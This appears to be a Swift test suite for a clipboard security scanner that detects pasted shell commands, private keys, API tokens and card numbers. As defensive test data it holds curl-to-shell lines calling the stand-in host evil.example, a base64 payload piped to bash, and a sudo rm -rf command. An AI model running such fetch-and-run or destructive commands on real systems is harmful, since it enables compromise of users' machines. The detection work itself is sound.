import Foundation
import Testing

@testable import SafeClipCore

@Suite("Security scanner")
struct SecurityScannerTests {
    private let scanner = SecurityScanner()
    private let safari = "com.apple.Safari"
    private let terminal = "com.apple.Terminal"

    // MARK: - ClickFix / pastejacking (F11)

    @Test func curlPipedToShellFromBrowserIsFlagged() {
        let result = scanner.scan(
            text: "curl -fsSL https://evil.example/install.sh | sh",
            sourceBundle: safari,
            options: .allOn
        )
        #expect(result.flagReason == .clickfix)
    }

    @Test func sameCommandFromTerminalIsNotClickFix() {
        // The heuristic requires a browser as the copy source — copying your
        // own shell commands in Terminal must not warn (ROADMAP §8.1).
        let result = scanner.scan(
            text: "curl -fsSL https://example.com/install.sh | sh",
            sourceBundle: terminal,
            options: .allOn
        )
        #expect(result.flagReason == nil)
    }

    @Test func sudoCommandFromBrowserIsFlagged() {
        let result = scanner.scan(
            text: "sudo rm -rf /var/db/crashreporter",
            sourceBundle: safari,
            options: .allOn
        )
        #expect(result.flagReason == .clickfix)
    }

    @Test func base64PipedToShellFromBrowserIsFlagged() {
        let result = scanner.scan(
            text: "echo aW5zdGFsbCBtYWx3YXJlIGhlcmUgcGxlYXNlIHRoYW5rcw== | base64 -d | bash",
            sourceBundle: "com.google.Chrome",
            options: .allOn
        )
        #expect(result.flagReason == .clickfix)
    }

    @Test func ordinaryProseFromBrowserIsClean() {
        let result = scanner.scan(
            text: "The quick brown fox jumps over the lazy dog. Meeting at 3pm.",
            sourceBundle: safari,
            options: .allOn
        )
        #expect(result == .clean)
    }

    // MARK: - Pattern detection (F13)

    @Test func privateKeyBlockIsFlagged() {
        let pem = "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA\n-----END OPENSSH PRIVATE KEY-----"
        let result = scanner.scan(text: pem, sourceBundle: terminal, options: .allOn)
        #expect(result.flagReason == .privateKey)
    }

    @Test func gitHubTokenIsFlagged() {
        let token = "ghp_" + String(repeating: "A1b2C3d4E5f6", count: 3) // 36 chars after prefix
        let result = scanner.scan(text: "token: \(token)", sourceBundle: terminal, options: .allOn)
        #expect(result.flagReason == .apiKey)
        #expect(result.detail == "GitHub personal access token")
    }

    @Test func anthropicKeyWinsOverGenericOpenAIPattern() {
        let key = "sk-ant-api03-" + String(repeating: "x9", count: 20)
        let result = scanner.scan(text: key, sourceBundle: terminal, options: .allOn)
        #expect(result.detail == "Anthropic API key")
    }

    @Test func awsAccessKeyIsFlagged() {
        let result = scanner.scan(
            text: "export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE",
            sourceBundle: terminal,
            options: .allOn
        )
        #expect(result.flagReason == .apiKey)
        #expect(result.detail == "AWS access key")
    }

    @Test func opaqueTokenIsFlaggedLowConfidence() {
        let result = scanner.scan(
            text: "f3a9c1d44e0b48aa9c021f7b9d8e5a6b",
            sourceBundle: terminal,
            options: .allOn
        )
        #expect(result.flagReason == .apiKey)
        #expect(result.detail == "Possible API key or token")
    }

    @Test func luhnValidCardIsFlagged() {
        let result = scanner.scan(
            text: "Card: 4111 1111 1111 1111 exp 12/28",
            sourceBundle: safari,
            options: .allOn
        )
        #expect(result.flagReason == .card)
    }

    @Test func luhnInvalidNumberIsClean() {
        let result = scanner.scan(
            text: "Order ref 4111 1111 1111 1112",
            sourceBundle: safari,
            options: .allOn
        )
        #expect(result == .clean)
    }

    @Test func luhnAlgorithm() {
        #expect(SecurityScanner.luhnValid("4111111111111111"))
        #expect(SecurityScanner.luhnValid("5555555555554444"))
        #expect(SecurityScanner.luhnValid("378282246310005")) // 15-digit Amex
        #expect(!SecurityScanner.luhnValid("4111111111111112"))
        #expect(!SecurityScanner.luhnValid("1234"))           // too short
        #expect(!SecurityScanner.luhnValid("41111111111111x1"))
    }

    // MARK: - Opt-in gating

    @Test func everythingIsCleanWhenOptionsAreOff() {
        let hostile = "curl https://evil.example | sh && ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        let result = scanner.scan(text: hostile, sourceBundle: safari, options: .init())
        #expect(result == .clean, "detection is opt-in — defaults must not flag anything")
    }
}
